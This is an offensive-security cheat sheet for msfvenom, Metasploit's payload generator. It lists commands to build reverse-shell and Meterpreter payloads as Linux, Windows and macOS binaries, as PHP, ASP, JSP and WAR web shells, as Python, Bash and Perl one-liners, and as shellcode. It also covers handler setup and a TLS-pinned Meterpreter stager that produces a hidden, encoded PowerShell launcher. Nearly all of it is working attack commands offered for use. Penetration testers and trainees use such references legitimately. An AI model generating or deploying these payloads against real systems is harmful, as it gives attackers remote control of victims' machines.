# msfvenom
Msfvenom is an utility software which comes with metasploit and it can be used
as a payload generator to be used for the following purposes:

* Payload Encoder
* Assistant in Exploit Generation
* Trojan Backdoors
* Generation of web shells

It also has an option to help with antivirus evasion (although quite limited).


Let's see how to use it, we can basically use the --list option to show the
available options for the following elements:
* payloads
* formats
* encoders
* archs (architectures)
* platforms

# General Notes

To show all payloads and get all the meterpreter related we ca do:

    msfvenom --list  payloads | grep meterpreter 

Once we select a payload, we can check what options are available for that
payload with:

    msfvenom --payload linux/x64/meterpreter/reverse_tcp  --list-options

Notice that in older versions of metasploit instead of `--list-options` we had
to use `--payload-options`.

We can check what format we have available to generate our payload:

    msfvenom --list formats
    msfvenom --list platforms

Once we see a format and platform that we need/like we can do:

    msfvenom --payload linux/x64/meterpreter/reverse_tcp lhost=192.168.1.3 lport=4444 --format elf -o out_filename

Notice that with msfvenom it may be useful to use sometimes `--smallest` to
generate a very small payload.

# Generate Binaries

## Linux
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf


## Windows
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe


## Mac
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.macho


# Web Payloads

## PHP
msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php


## ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp


## JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp


## WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war


## Scripting Payloads

## Python
msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py


## Bash
msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh


## Perl
msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl


# Shellcode
For all shellcode see 'msfvenom --help-formats' for information as
to valid parameters. Msfvenom will output code that is able to be cut
and pasted in this language for your exploits.

## Linux Based Shellcode
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>


## Windows Based Shellcode
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>


## Mac Based Shellcode
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>


# Handlers
Metasploit handlers can be great at quickly setting up Metasploit to
be in a position to receive your incoming shells. Handlers should be in
the following format.

    use exploit/multi/handler
    set PAYLOAD <Payload name>   ;; it is very important to match the payload here
    set LHOST <LHOST value>
    set LPORT <LPORT value>
    set ExitOnSession false
    exploit -j -z

Once the required values are completed the following command will execute
your handler - 'msfconsole -L -r '


## Paranoid Meterpreter Payload

n some scenarios, it pays to be paranoid. This also applies to generating
and handling Meterpreter sessions. This document walks through the
process of implementing a paranoid Meterpreter payload and listener.

### Create a SSL/TLS Certificate

;; For best results, use a SSL/TLS certificate signed by a trusted
;; certificate authority. Failing that, you can still generate a self-signed
;; unified PEM using the following command:
openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 \
    -subj "/C=US/ST=Texas/L=Austin/O=Development/CN=www.example.com" \
    -keyout www.example.com.key \
    -out www.example.com.crt && \
cat www.example.com.key  www.example.com.crt > www.example.com.pem && \
rm -f www.example.com.key  www.example.com.crt

### Create a Paranoid Payload

;; For this use case, we will combine Payload UUID tracking and whitelisting
;; with TLS pinning. For a staged payload, we will use the following command:
./msfvenom -p windows/meterpreter/reverse_winhttps LHOST=www.example.com LPORT=443 PayloadUUIDTracking=true HandlerSSLCert=./www.example.com.pem StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedPSH -f psh-cmd -o launch-paranoid.bat

head launch-paranoid.bat  ;; should look something like this:
%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcg...

;; A stageless version of this would look like the following:
./msfvenom -p windows/meterpreter_reverse_https LHOST=www.example.com LPORT=443 PayloadUUIDTracking=true HandlerSSLCert=./www.example.com.pem StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedStageless -f exe -o launch-paranoid-stageless.exe

### Create a Paranoid Listener
;; A staged payload would need to set the HandlerSSLCert
;; and StagerVerifySSLCert options to enable TLS pinning and
;; IgnoreUnknownPayloads to whitelist registered payload UUIDs:

./msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_winhttps; set LHOST www.example.com; set LPORT 443; set HandlerSSLCert ./www.example.com.pem; set IgnoreUnknownPayloads true; set StagerVerifySSLCert true; run -j'

;;A stageless version is only slightly different:
./msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter_reverse_https; set LHOST www.example.com; set LPORT 443; set HandlerSSLCert ./www.example.com.pem; set IgnoreUnknownPayloads true; set StagerVerifySSLCert true; run -j'

